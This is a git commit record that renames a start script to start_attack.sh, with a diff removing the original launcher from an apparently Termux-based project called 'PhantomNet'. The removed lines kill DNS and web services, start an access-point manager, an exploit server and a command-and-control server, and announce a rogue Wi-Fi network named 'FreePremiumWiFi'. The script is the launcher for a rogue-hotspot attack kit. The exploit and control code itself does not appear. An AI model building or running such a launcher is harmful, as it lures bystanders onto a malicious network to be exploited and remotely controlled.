d15808ab406646aabb448d604f0e8f39425b023b
VERAN-TECH-HUB <veranmaina685@gmail.com>
2025-02-18 23:45:10 +0100

    Update and rename start.sh to start_attack.sh

--- scripts/start.sh
+++
@@ -1,6 +0,0 @@
-#!/data/data/com.termux/files/usr/bin/bash  
-killall dnsmasq php node 2>/dev/null  
-core/ap_manager.sh &  
-node core/exploit_server.js &  
-node core/c2_server.js &  
-echo "[+] PhantomNet Active! Connect to 'FreePremiumWiFi'."  
